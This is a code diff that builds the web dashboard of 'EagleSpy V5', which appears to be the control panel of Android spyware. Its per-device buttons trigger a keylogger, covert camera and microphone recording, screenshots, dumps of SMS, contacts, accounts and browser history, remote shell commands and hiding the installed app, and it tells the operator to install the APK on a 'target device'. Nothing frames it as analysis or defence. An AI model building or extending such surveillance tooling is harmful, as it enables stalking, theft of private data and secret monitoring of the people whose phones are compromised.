@@ -1,66 +1,295 @@
-<%= content_for :title, "Dashboard Modernization" %>
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta name="csrf-token" content="<%= form_authenticity_token rescue '' %>">
+<title>EagleSpy V5 — Dashboard</title>
+<style>
+*,*::before,*::after{box-sizing:border-box;margin:0;padding:0}
+html{font-size:14px}
+body{background:#0a0a0f;color:#e0e0e0;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,Helvetica,Arial,sans-serif;line-height:1.5;min-height:100vh}
+a{color:#00d4ff;text-decoration:none}
+a:hover{text-decoration:underline}
 
-<div class="container-fluid py-4" data-controller="dashboard">
-  <div class="row mb-3">
-    <div class="col">
-      <h1 class="mb-0">EagleSpy Control Center</h1>
-      <p class="text-muted">Device telemetry, streaming, and command visibility in one modern view.</p>
-    </div>
-  </div>
+/* Header */
+.header{background:#111119;border-bottom:1px solid #1e1e2e;padding:16px 24px;display:flex;align-items:center;justify-content:space-between;position:sticky;top:0;z-index:100}
+.header h1{font-size:1.4rem;font-weight:700;color:#fff}
+.header h1 span{color:#00d4ff}
+.header-right{display:flex;gap:12px;align-items:center}
+.header-right a{font-size:.85rem;padding:6px 14px;border:1px solid #2a2a3a;border-radius:6px;color:#aaa;transition:color .15s,border-color .15s}
+.header-right a:hover{color:#00d4ff;border-color:#00d4ff;text-decoration:none}
+.refresh-btn{cursor:pointer;background:none}
 
-  <div class="row">
-    <div class="col-md-4 mb-3">
-      <div class="card shadow-sm h-100">
-        <div class="card-header d-flex justify-content-between">
-          <span>Devices</span>
-          <small class="text-muted">live</small>
-        </div>
-        <div class="card-body p-0" data-dashboard-target="devices">
-          <div class="p-3 text-center text-muted">Loading devices…</div>
-        </div>
-      </div>
-    </div>
+/* Container */
+.container{max-width:1440px;margin:0 auto;padding:20px 24px 40px}
 
-    <div class="col-md-8 mb-3">
-      <div class="card shadow-sm h-100">
-        <div class="card-header d-flex justify-content-between">
-          <span>Streaming Viewer</span>
-          <small class="text-muted">WebRTC status</small>
-        </div>
-        <div class="card-body" data-dashboard-target="stream">
-          <div class="embed-responsive embed-responsive-16by9 bg-dark rounded d-flex align-items-center justify-content-center">
-            <span class="text-white-50">Stream will appear here when WebRTC is active.</span>
-          </div>
-        </div>
-      </div>
-    </div>
-  </div>
+/* Stats Row */
+.stats-row{display:grid;grid-template-columns:repeat(auto-fit,minmax(160px,1fr));gap:14px;margin-bottom:28px}
+.stat-card{background:#111119;border:1px solid #1e1e2e;border-radius:10px;padding:18px 16px;text-align:center}
+.stat-card .stat-value{font-size:2rem;font-weight:700;color:#fff;line-height:1.2}
+.stat-card .stat-label{font-size:.78rem;color:#777;text-transform:uppercase;letter-spacing:.6px;margin-top:4px}
+.stat-card:nth-child(1) .stat-value{color:#00d4ff}
+.stat-card:nth-child(2) .stat-value{color:#a78bfa}
+.stat-card:nth-child(3) .stat-value{color:#34d399}
+.stat-card:nth-child(4) .stat-value{color:#fbbf24}
+.stat-card:nth-child(5) .stat-value{color:#f87171}
+.stat-card:nth-child(6) .stat-value{color:#f472b6}
 
-  <div class="row">
-    <div class="col-md-8 mb-3">
-      <div class="card shadow-sm">
-        <div class="card-header d-flex justify-content-between">
-          <span>Command Queue</span>
-          <span class="small text-muted">Latest 30</span>
-        </div>
-        <div class="card-body p-0" data-dashboard-target="commands">
-          <div class="p-3 text-muted text-center">Loading queue…</div>
-        </div>
-      </div>
-    </div>
+/* Section Title */
+.section-title{font-size:1.1rem;font-weight:600;color:#fff;margin-bottom:16px}
 
-    <div class="col-md-4 mb-3">
-      <div class="card shadow-sm">
-        <div class="card-header d-flex justify-content-between">
-          <span>Upload Progress</span>
-          <small class="text-muted">Chunked uploads</small>
-        </div>
-        <div class="card-body" data-dashboard-target="uploads">
-          <div class="text-muted text-center">Monitoring uploads…</div>
-        </div>
-      </div>
-    </div>
+/* Device Grid */
+.device-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(380px,1fr));gap:18px}
+
+/* Device Card */
+.device-card{background:#111119;border:1px solid #1e1e2e;border-radius:12px;overflow:hidden}
+.device-header{padding:16px 18px;display:flex;align-items:center;justify-content:space-between;border-bottom:1px solid #1a1a28}
+.device-name{font-weight:600;font-size:1rem;color:#fff}
+.device-id{font-size:.75rem;color:#555;font-family:'Courier New',monospace;margin-top:2px}
+.status-dot{width:10px;height:10px;border-radius:50%;flex-shrink:0}
+.status-dot.online{background:#22c55e;box-shadow:0 0 6px #22c55e80}
+.status-dot.offline{background:#555}
+
+.device-body{padding:14px 18px 18px}
+
+/* Command Sections */
+.cmd-section{margin-bottom:14px}
+.cmd-section:last-child{margin-bottom:0}
+.cmd-section-title{font-size:.72rem;font-weight:600;text-transform:uppercase;letter-spacing:.8px;color:#666;margin-bottom:8px;padding-bottom:4px;border-bottom:1px solid transparent;display:flex;align-items:center;gap:6px}
+.cmd-section-title .sec-icon{font-size:.85rem}
+.cmd-section[data-section="live"] .cmd-section-title{color:#22c55e;border-color:#22c55e30}
+.cmd-section[data-section="capture"] .cmd-section-title{color:#f59e0b;border-color:#f59e0b30}
+.cmd-section[data-section="data"] .cmd-section-title{color:#3b82f6;border-color:#3b82f630}
+.cmd-section[data-section="extract"] .cmd-section-title{color:#8b5cf6;border-color:#8b5cf630}
+.cmd-section[data-section="control"] .cmd-section-title{color:#ef4444;border-color:#ef444430}
+.cmd-section[data-section="ai"] .cmd-section-title{color:#06b6d4;border-color:#06b6d430}
+
+.cmd-grid{display:flex;flex-wrap:wrap;gap:6px}
+
+/* Buttons */
+.cmd-btn{display:inline-flex;align-items:center;gap:4px;padding:5px 10px;font-size:.75rem;border-radius:6px;border:1px solid #2a2a3a;background:#0d0d15;color:#ccc;cursor:pointer;font-family:inherit;transition:border-color .15s,color .15s,background .15s;white-space:nowrap}
+.cmd-btn:hover{border-color:#00d4ff;color:#00d4ff;background:#00d4ff08;text-decoration:none}
+.cmd-btn.loading{opacity:.5;pointer-events:none}
+a.cmd-btn{text-decoration:none}
+
+/* Empty State */
+.empty-state{text-align:center;padding:80px 20px;color:#555}
+.empty-state h2{font-size:1.5rem;color:#777;margin-bottom:8px}
+.empty-state p{font-size:.9rem;margin-bottom:20px}
+.empty-state a{color:#00d4ff}
+
+/* Toast */
+.toast-container{position:fixed;top:16px;right:16px;z-index:9999;display:flex;flex-direction:column;gap:8px;pointer-events:none}
+.toast{pointer-events:auto;padding:12px 18px;border-radius:8px;font-size:.85rem;color:#fff;max-width:360px;animation:slideIn .25s ease-out;border:1px solid}
+.toast.success{background:#0f2a1d;border-color:#22c55e50}
+.toast.error{background:#2a0f0f;border-color:#ef444450}
+.toast.info{background:#0f1a2a;border-color:#3b82f650}
+@keyframes slideIn{from{transform:translateX(80px);opacity:0}to{transform:translateX(0);opacity:1}}
+@keyframes fadeOut{from{opacity:1}to{opacity:0}}
+
+/* Responsive */
+@media(max-width:480px){
+  .device-grid{grid-template-columns:1fr}
+  .stats-row{grid-template-columns:repeat(3,1fr)}
+  .header{padding:12px 16px}
+  .container{padding:14px 16px 30px}
+}
+</style>
+</head>
+<body>
+
+<div class="header">
+  <h1>🦅 Eagle<span>Spy</span> V5</h1>
+  <div class="header-right">
+    <a href="/admin" title="Admin Panel">Admin</a>
+    <a href="/dashboard" class="refresh-btn" title="Refresh">↻ Refresh</a>
   </div>
 </div>
 
-<%= javascript_pack_tag "dashboard", defer: true %>
+<div class="container">
+  <!-- Stats Row -->
+  <div class="stats-row">
+    <div class="stat-card">
+      <div class="stat-value"><%= @stats[:devices] %></div>
+      <div class="stat-label">Devices</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value"><%= @stats[:keylogs] %></div>
+      <div class="stat-label">Keylogs</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value"><%= @stats[:sms] %></div>
+      <div class="stat-label">SMS</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value"><%= @stats[:locations] %></div>
+      <div class="stat-label">Locations</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value"><%= @stats[:photos] %></div>
+      <div class="stat-label">Photos</div>
+    </div>
+    <div class="stat-card">
+      <div class="stat-value"><%= @stats[:recordings] %></div>
+      <div class="stat-label">Recordings</div>
+    </div>
+  </div>
+
+  <% if @devices.empty? %>
+    <div class="empty-state">
+      <h2>No devices connected</h2>
+      <p>Install the APK on a target device to get started.</p>
+      <a href="/admin/apk_installations">Manage APK Installations →</a>
+    </div>
+  <% else %>
+    <div class="section-title">Connected Devices (<%= @stats[:devices] %>)</div>
+    <div class="device-grid">
+      <% @devices.each do |device| %>
+        <% online = device.updated_at && (Time.current - device.updated_at) < 5.minutes %>
+        <div class="device-card">
+          <div class="device-header">
+            <div>
+              <div class="device-name"><%= device.name || "Device" %></div>
+              <div class="device-id"><%= device.device_id %></div>
+            </div>
+            <div class="status-dot <%= online ? 'online' : 'offline' %>" title="<%= online ? 'Online' : 'Offline' %>"></div>
+          </div>
+          <div class="device-body">
+
+            <%# ── LIVE ── %>
+            <div class="cmd-section" data-section="live">
+              <div class="cmd-section-title"><span class="sec-icon">🟢</span> LIVE</div>
+              <div class="cmd-grid">
+                <a class="cmd-btn" href="/admin/live_streaming?device_id=<%= device.id %>">📹 Camera</a>
+                <a class="cmd-btn" href="/admin/live_location?device_id=<%= device.id %>">📍 Location</a>
+                <a class="cmd-btn" href="/admin/keylogs?q[smartphone_id_eq]=<%= device.id %>">⌨️ Keylogger</a>
+                <button class="cmd-btn" data-url="/recordings/microphone_rec?smartphone_id=<%= device.id %>&duration=10" data-method="POST">🎙️ Mic Record</button>
+              </div>
+            </div>
+
+            <%# ── CAPTURE ── %>
+            <div class="cmd-section" data-section="capture">
+              <div class="cmd-section-title"><span class="sec-icon">📸</span> CAPTURE</div>
+              <div class="cmd-grid">
+                <button class="cmd-btn" data-url="/smartphones/take_picture?smartphone_id=<%= device.id %>" data-method="POST">📷 Photo</button>
+                <button class="cmd-btn" data-url="/smartphones/front_camera_snap?smartphone_id=<%= device.id %>" data-method="POST">🤳 Front Cam</button>
+                <button class="cmd-btn" data-url="/screenshots/dump_screen_snap?smartphone_id=<%= device.id %>" data-method="GET">🖥️ Screenshot</button>
+                <button class="cmd-btn" data-url="/screenshots/screen_record?smartphone_id=<%= device.id %>&duration=30" data-method="POST">⏺️ Screen Rec</button>
+                <button class="cmd-btn" data-url="/smartphones/ambient_record?smartphone_id=<%= device.id %>&duration=60" data-method="POST">🔊 Ambient</button>
+              </div>
+            </div>
+
+            <%# ── DATA ── %>
+            <div class="cmd-section" data-section="data">
+              <div class="cmd-section-title"><span class="sec-icon">📂</span> DATA</div>
+              <div class="cmd-grid">
+                <a class="cmd-btn" href="/admin/sms_messages?q[smartphone_id_eq]=<%= device.id %>">💬 SMS</a>
+                <a class="cmd-btn" href="/admin/call_logs?q[smartphone_id_eq]=<%= device.id %>">📞 Calls</a>
+                <a class="cmd-btn" href="/admin/contacts?q[smartphone_id_eq]=<%= device.id %>">👤 Contacts</a>
+                <a class="cmd-btn" href="/admin/pictures?q[smartphone_id_eq]=<%= device.id %>">🖼️ Gallery</a>
+                <a class="cmd-btn" href="/admin/recordings?q[smartphone_id_eq]=<%= device.id %>">🎧 Audio</a>
+                <a class="cmd-btn" href="/admin/screenshots?q[smartphone_id_eq]=<%= device.id %>">📸 Screenshots</a>
+                <a class="cmd-btn" href="/admin/social_media_messages?q[smartphone_id_eq]=<%= device.id %>">💬 Social</a>
+                <a class="cmd-btn" href="/admin/geo_locations?q[smartphone_id_eq]=<%= device.id %>">🗺️ Locations</a>
+                <a class="cmd-btn" href="/admin/file_browser?device_id=<%= device.id %>">📁 Files</a>
+              </div>
+            </div>
+
+            <%# ── EXTRACT ── %>
+            <div class="cmd-section" data-section="extract">
+              <div class="cmd-section-title"><span class="sec-icon">⬇️</span> EXTRACT</div>
+              <div class="cmd-grid">
+                <button class="cmd-btn" data-url="/smartphones/dump_device_info?smartphone_id=<%= device.id %>" data-method="POST">📱 Device Info</button>
+                <button class="cmd-btn" data-url="/smartphones/dump_wifi_info?smartphone_id=<%= device.id %>" data-method="POST">📶 WiFi Info</button>
+                <button class="cmd-btn" data-url="/smartphones/get_accounts?smartphone_id=<%= device.id %>" data-method="POST">👥 Accounts</button>
+                <button class="cmd-btn" data-url="/smartphones/get_app_usage?smartphone_id=<%= device.id %>" data-method="POST">📊 App Usage</button>
+                <button class="cmd-btn" data-url="/smartphones/get_browser_history?smartphone_id=<%= device.id %>" data-method="POST">🌐 Browser</button>
+                <button class="cmd-btn" data-url="/contacts/dump_contacts?smartphone_id=<%= device.id %>" data-method="POST">📇 Dump Contacts</button>
+              </div>
+            </div>
+
+            <%# ── CONTROL ── %>
+            <div class="cmd-section" data-section="control">
+              <div class="cmd-section-title"><span class="sec-icon">🎮</span> CONTROL</div>
+              <div class="cmd-grid">
+                <button class="cmd-btn" data-url="/smartphones/run_shell_command?smartphone_id=<%= device.id %>" data-method="POST">💻 Shell</button>
+                <button class="cmd-btn" data-url="/smartphones/list_apps?smartphone_id=<%= device.id %>" data-method="POST">📋 List Apps</button>
+                <button class="cmd-btn" data-url="/smartphones/hide_app?smartphone_id=<%= device.id %>" data-method="GET">🙈 Hide App</button>
+                <button class="cmd-btn" data-url="/smartphones/show_app?smartphone_id=<%= device.id %>" data-method="GET">👁️ Show App</button>
+                <button class="cmd-btn" data-url="/smartphones/toggle_wifi?smartphone_id=<%= device.id %>" data-method="POST">📶 Toggle WiFi</button>
+                <button class="cmd-btn" data-url="/smartphones/wake_lock?smartphone_id=<%= device.id %>" data-method="POST">🔒 Wake Lock</button>
+                <button class="cmd-btn" data-url="/smartphones/set_audio_mode?smartphone_id=<%= device.id %>&mode=silent" data-method="POST">🔇 Silent</button>
+                <button class="cmd-btn" data-url="/sms_messages/send_sms?smartphone_id=<%= device.id %>" data-method="POST">📤 Send SMS</button>
+              </div>
+            </div>
+
+            <%# ── AI ── %>
+            <div class="cmd-section" data-section="ai">
+              <div class="cmd-section-title"><span class="sec-icon">🤖</span> AI</div>
+              <div class="cmd-grid">
+                <a class="cmd-btn" href="/admin/ai_chat">💬 AI Chat</a>
+                <a class="cmd-btn" href="/admin/ai_analysis">📊 Analysis</a>
+                <a class="cmd-btn" href="/admin/ai_health">❤️ Health</a>
+              </div>
+            </div>
+
+          </div>
+        </div>
+      <% end %>
+    </div>
+  <% end %>
+</div>
+
+<div class="toast-container" id="toasts"></div>
+
+<script>
+(function(){
+  var csrf = document.querySelector('meta[name="csrf-token"]');
+  var token = csrf ? csrf.content : '';
+
+  function toast(msg, type) {
+    var el = document.createElement('div');
+    el.className = 'toast ' + (type || 'info');
+    el.textContent = msg;
+    document.getElementById('toasts').appendChild(el);
+    setTimeout(function() {
+      el.style.animation = 'fadeOut .3s ease-out forwards';
+      setTimeout(function() { el.remove(); }, 300);
+    }, 3000);
+  }
+
+  document.addEventListener('click', function(e) {
+    var btn = e.target.closest('button.cmd-btn');
+    if (!btn) return;
+
+    var url = btn.getAttribute('data-url');
+    var method = btn.getAttribute('data-method') || 'POST';
+    if (!url) return;
+
+    btn.classList.add('loading');
+    btn.disabled = true;
+
+    var opts = { method: method, headers: {} };
+    if (token) opts.headers['X-CSRF-Token'] = token;
+
+    fetch(url, opts)
+      .then(function(r) {
+        if (r.ok) {
+          toast('✓ Command sent', 'success');
+        } else {
+          toast('✗ Error (' + r.status + ')', 'error');
+        }
+      })
+      .catch(function() {
+        toast('✗ Network error', 'error');
+      })
+      .finally(function() {
+        btn.classList.remove('loading');
+        btn.disabled = false;
+      });
+  });
+})();
+</script>
+</body>
+</html>
